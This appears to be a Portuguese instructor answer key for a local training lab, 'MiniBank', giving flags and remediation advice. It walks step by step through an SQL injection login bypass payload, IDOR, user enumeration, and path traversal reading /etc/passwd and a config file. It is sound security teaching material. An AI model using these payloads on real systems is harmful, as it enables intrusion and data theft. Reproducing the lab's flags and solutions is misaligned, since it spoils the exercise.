# Solution - lab-01-minibank

Gabarito técnico objetivo do lab **lab-01-minibank**.

Escopo autorizado:

```text
http://127.0.0.1:8088

Este arquivo mostra o caminho completo para capturar as flags. Use como material do instrutor ou como apoio final para alunos que já tentaram resolver o lab.

1. Enumeração inicial

Acesse a aplicação no navegador:

http://127.0.0.1:8088

Observe a página inicial do MiniBank Internal Portal.

Agora visualize o código-fonte da página:

Ctrl + U

Procure comentários HTML. O comentário esperado é:

<!-- revisar robots.txt antes de publicar o portal legado -->

Esse comentário indica que existe um arquivo robots.txt que pode conter rotas sensíveis, antigas ou esquecidas.

Acesse manualmente:

http://127.0.0.1:8088/robots.txt

Rotas descobertas:

/admin
/backup
/dev.txt
/download
/status

Acesse também:

http://127.0.0.1:8088/status

Esse endpoint retorna informações verbosas da aplicação, como:

app
version
env
internal_path
database

O /status não possui flag, mas ajuda na enumeração e no entendimento do ambiente.

2. Credencial exposta

Pelo robots.txt, foi descoberta a rota:

/dev.txt

Acesse no navegador:

http://127.0.0.1:8088/dev.txt

O arquivo contém uma anotação de desenvolvimento com credencial exposta:

backup_user:backup123

Também contém a flag:

FLAG{credencial_exposta_capturada}

Valide o impacto da credencial acessando:

http://127.0.0.1:8088/backup

Quando o navegador solicitar autenticação, use:

Usuário: backup_user
Senha: backup123

A falha aqui é a exposição de credencial em arquivo público.

3. Enumeração de usuários no login

Acesse a página de login:

http://127.0.0.1:8088/login

Teste um usuário inexistente:

Usuário: naoexiste
Senha: teste

Resultado esperado:

Usuario nao encontrado.

Agora teste um usuário existente com senha errada:

Usuário: joao
Senha: errada

Resultado esperado:

Senha invalida.

Isso permite enumerar usuários válidos, porque a aplicação retorna mensagens diferentes para usuário inexistente e senha incorreta.

Essa falha é intencional no lab e não possui flag própria.

Usuário válido identificado:

joao
4. SQL Injection no login

Ainda na página de login:

http://127.0.0.1:8088/login

Use o seguinte payload no campo de usuário:

admin' OR '1'='1' -- 

No campo de senha, coloque qualquer valor:

qualquercoisa

O espaço após -- faz parte do payload. Ele é necessário para o comentário MySQL funcionar corretamente.

Ao enviar o formulário, a aplicação deve redirecionar para:

/dashboard

No dashboard, deve aparecer:

Usuario: admin | Perfil: admin

E a flag:

FLAG{sqli_capturada}

A falha ocorre porque a aplicação concatena o valor do campo username diretamente em uma consulta SQL. O payload força uma condição verdadeira e ignora o restante da query.

5. IDOR em contas

Faça login com o usuário comum:

Usuário: joao
Senha: joao123

Após o login, acesse a conta do próprio usuário:

http://127.0.0.1:8088/account/1

Agora altere manualmente o ID na URL para acessar outra conta:

http://127.0.0.1:8088/account/2

A aplicação permite visualizar uma conta de outro usuário sem validar se ela pertence ao usuário autenticado.

Na conta /account/2, deve aparecer:

FLAG{idor_capturada}

Essa é uma falha de autorização/falha lógica: o sistema valida que existe uma sessão, mas não valida o dono do recurso acessado.

6. Path Traversal / LFI controlado

Pelo robots.txt, foi descoberta a rota:

/download

Acesse:

http://127.0.0.1:8088/download

A página mostra arquivos disponíveis para download, como:

public-info.txt
report-q1.txt
report-q2.txt

Clique primeiro em:

public-info.txt

Observe que a URL fica parecida com:

/download?file=public-info.txt

Isso mostra que a aplicação recebe o nome do arquivo pelo parâmetro file.

Agora abra o relatório que contém a pista:

http://127.0.0.1:8088/download?file=report-q2.txt

Pista relevante:

Durante a migracao, a configuracao antiga foi movida para o diretorio config.
Arquivo revisado pela equipe: legacy.conf

Antes de buscar a flag, valide a falha de Path Traversal tentando ler um arquivo comum do Linux:

http://127.0.0.1:8088/download?file=../../../../etc/passwd

Se a aplicação retornar conteúdo com linhas parecidas com root:x:0:0, a leitura fora do diretório esperado foi confirmada.

O endpoint /status vaza o caminho interno da aplicação:

internal_path=/usr/src/app

Como o downloader lê arquivos a partir de:

/usr/src/app/files

e a pista aponta para:

config/legacy.conf

é possível sair de files e acessar o diretório config com:

../config/legacy.conf

Acesse:

http://127.0.0.1:8088/download?file=../config/legacy.conf

O arquivo deve revelar:

FLAG{path_traversal_capturada}
7. Flags finais

As quatro flags do lab são:

FLAG{credencial_exposta_capturada}
FLAG{sqli_capturada}
FLAG{idor_capturada}
FLAG{path_traversal_capturada}
8. Resumo das falhas
Falha	Onde ocorre	Evidência
Credencial exposta	/dev.txt	backup_user:backup123 e flag
User Enumeration	/login	mensagens diferentes para usuário inexistente e senha inválida
SQL Injection	/login	bypass para dashboard admin
IDOR / falha lógica	/account/:id	usuário comum acessa /account/2
Path Traversal	/download?file=	leitura de /etc/passwd e ../config/legacy.conf
9. Correções recomendadas
Credencial exposta

Remover arquivos sensíveis da pasta pública, usar variáveis de ambiente e rotacionar credenciais vazadas.

User Enumeration

Usar mensagem genérica para falhas de login, por exemplo:

Usuário ou senha inválidos.
SQL Injection

Usar queries parametrizadas/prepared statements e nunca concatenar entrada do usuário diretamente em SQL.

IDOR

Validar no backend se o recurso acessado pertence ao usuário autenticado.

Path Traversal

Normalizar caminhos, bloquear ../, usar allowlist de arquivos e garantir que o arquivo final permaneça dentro do diretório permitido.
